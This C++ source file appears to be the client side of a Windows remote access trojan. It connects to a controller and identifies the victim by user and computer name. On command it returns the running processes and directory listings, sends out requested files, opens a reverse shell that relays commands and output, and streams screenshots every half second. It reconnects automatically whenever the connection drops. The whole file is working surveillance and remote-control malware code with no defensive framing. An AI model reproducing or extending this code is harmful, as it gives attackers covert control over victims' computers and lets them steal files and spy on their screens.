#include "Application.h"
#include "appdefs.h"

#include "services/NetClientService.h"
#include "services/ShellService.h"
#include "services/SystemInfoService.h"

#include "concurrent/events/net/NetEvent.h"
#include "concurrent/events/net/PacketNetEvent.h"

#include "../../shared/NetLib/packets/PacketPresentation.h"
#include "../../shared/NetLib/packets/PacketProcess.h"
#include "../../shared/NetLib/packets/PacketFileSystem.h"
#include "../../shared/NetLib/packets/PacketDownload.h"
#include "../../shared/NetLib/packets/PacketMediaResponse.h"
#include "../../shared/NetLib/packets/PacketShell.h"

#include "../../shared/IOLib/services/FileSystemService.h"
#include "../../shared/ConcurrentLib/core/Thread.h"

#include "services/DesktopService.h"
#include "services/ProcessService.h"

#include <io.h>
#include <fcntl.h>
#include <iostream>

DWORD WINAPI startClientAsyncThreadFunc(LPVOID threadArg)
{
	auto netClientService = static_cast<NetClientService*>(threadArg);
	netClientService->start();
	return 0;
}

DWORD WINAPI listenNetEventsThreadFunc(LPVOID threadArg)
{
	auto app = static_cast<Application*>(threadArg);
	app->reactToNetEvents();
	return 0;
}

Application::Application(): shellService(nullptr)
{
}

Application::~Application()
{
}

void Application::startNetSubsystem()
{
	netClientService = new NetClientService(&netEventChannel);

	netClientThread = new Thread(
		static_cast<LPTHREAD_START_ROUTINE>(startClientAsyncThreadFunc),
		netClientService);

	netClientThread->run();
}

Application* Application::start()
{
	auto app = new Application;
	app->run();
	return app;
}

int Application::run()
{
#if SHOW_CONSOLE

	// startUiLooper();

	AllocConsole();
	SetConsoleTitleA("Client");
	typedef struct
	{
		char* _ptr;
		int _cnt;
		char* _base;
		int _flag;
		int _file;
		int _charbuf;
		int _bufsiz;
		char* _tmpfname;
	} FILE_COMPLETE;
	*(FILE_COMPLETE*)stdout = *(FILE_COMPLETE*)_fdopen(_open_osfhandle((long)GetStdHandle(STD_OUTPUT_HANDLE), _O_TEXT),
	                                                   "w");
	*(FILE_COMPLETE*)stderr = *(FILE_COMPLETE*)_fdopen(_open_osfhandle((long)GetStdHandle(STD_ERROR_HANDLE), _O_TEXT),
	                                                   "w");
	*(FILE_COMPLETE*)stdin = *(FILE_COMPLETE*)_fdopen(_open_osfhandle((long)GetStdHandle(STD_INPUT_HANDLE), _O_TEXT),
	                                                  "r");
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);
#endif

	startNetSubsystem();
	return reactToNetEvents();
}

void Application::handlePacket(Packet* packet)
{
	switch (packet->getType())
	{
	case PacketType::ProcessList:
		{
			PacketProcess* packetProcess = new PacketProcess;
			ProcessService::getProcessList(packetProcess->processes);
			// auto event = new PacketNetEvent(packetProcess);
			netClientService->sendPacket(packetProcess);
			break;
		}
	case PacketType::FileSystem:
		{
			PacketFileSystem* packetFileSystem = (PacketFileSystem*)packet;

			if (packetFileSystem->path.empty() || packetFileSystem->path == L"/"
				|| packetFileSystem->path == L"\\")
				FileSystemService::listRoots(packetFileSystem->files);
			else
				FileSystemService::listFilesW(static_cast<PacketFileSystem*>(packet)->path, packetFileSystem->files);

			// Make it recalculate payloadLength
			packetFileSystem->calculatePayloadLength();
			netClientService->sendPacket(packetFileSystem);
			break;
		}
	case PacketType::Download:
		{
			PacketDownload* packetDownload = (PacketDownload*)packet;

			if (FileSystemService::fileExists(packetDownload->filePath))
			{
				packetDownload->fileSize = FileSystemService::getFileSize(packetDownload->filePath);
				packetDownload->fileBytes = (char*)malloc(packetDownload->fileSize);
				FileSystemService::readBinaryFile(packetDownload->filePath.c_str(),
				                                  packetDownload->fileBytes, packetDownload->fileSize);
				packetDownload->calculatePayloadLength();
				netClientService->sendPacket(packetDownload);
			}
			break;
		}
	case PacketType::ReverseShell:
		{
			PacketShell* packetShell = (PacketShell*)packet;

			if (packetShell->action == PacketShellAction::Start)
			{
				if (shellService == nullptr)
					shellService = new ShellService(this);

				if (!shellService->isRunning())
					shellService->launch();
			}
			else if (packetShell->action == PacketShellAction::PushCommand)
			{
				if (shellService->isRunning())
					shellService->writeIntoProcess(packetShell->data);
			}
			break;
		}
	case PacketType::Desktop:
		{
			// TODO: this is blocking, so move it away, it is just for testing
			while (true)
			{
				std::pair<ULONGLONG, char*> bufferImage = DesktopService::getScreenshotAsByteArray();
				const auto packetDesktop = new PacketMediaResponse(PacketType::Desktop);
				packetDesktop->imageSize = bufferImage.first;
				packetDesktop->imageBytes = bufferImage.second;
				netClientService->sendPacket(packetDesktop);
				Sleep(500);
			}
			break;
		}
	default:
		std::cout << "Not implemented packet type functionality " __FUNCTION__ "::" << __LINE__ << std::endl;
		break;
	}
}


void Application::onShellClosed() const
{
	PacketShell* packet = new PacketShell();
	packet->action = PacketShellAction::Stop;
	netClientService->sendPacket(packet);
}

void Application::onShellOutput(char* buffer, unsigned long bufferLen) const
{
	PacketShell* packet = new PacketShell();
	packet->action = PacketShellAction::MoreData;
	packet->data = std::string(buffer, bufferLen);
	netClientService->sendPacket(packet);
}


int Application::reactToNetEvents()
{
	running = true;
	while (running)
	{
		NetEvent* event = netEventChannel.takeFromNetService();
		handleNetEvent(event);
	}

	return 0;
}


void Application::handleNetEvent(NetEvent* event)
{
	if (event == nullptr)
		return;

	switch (event->getEventType())
	{
	case NetEventType::ClientServiceExit:
		std::cout << event->getDescription() << std::endl;
		Sleep(10000);
		startNetSubsystem();
		return;
	case NetEventType::ConnectionOpened:
		{
			// SystemInfoStruct* sysInfo = systemInfoService.getBasicSystemInfo();

			char* userName = new char[INFO_BUFFER_SIZE];
			char* pcName = new char[INFO_BUFFER_SIZE];
			// Get and display the user name. 
			DWORD bufCharCount = INFO_BUFFER_SIZE;
			if (!GetUserNameA(userName, &bufCharCount))
			{
			}
			bufCharCount = INFO_BUFFER_SIZE;
			if (!GetComputerNameA(pcName, &bufCharCount))
			{
			}

			PacketPresentation* packet = new PacketPresentation();
			packet->username = userName;
			packet->pcName = pcName;

			// std::cout << "Packet size " << packet->getTotalLength() << std::endl;
			netClientService->sendPacket(packet);
			break;
		}
	case NetEventType::PacketReceived:
		{
			PacketNetEvent* packetEvent = (PacketNetEvent*)event;
			Packet* packet = packetEvent->packet;
			handlePacket(packet);
		}
	default:
		return;
	}
}
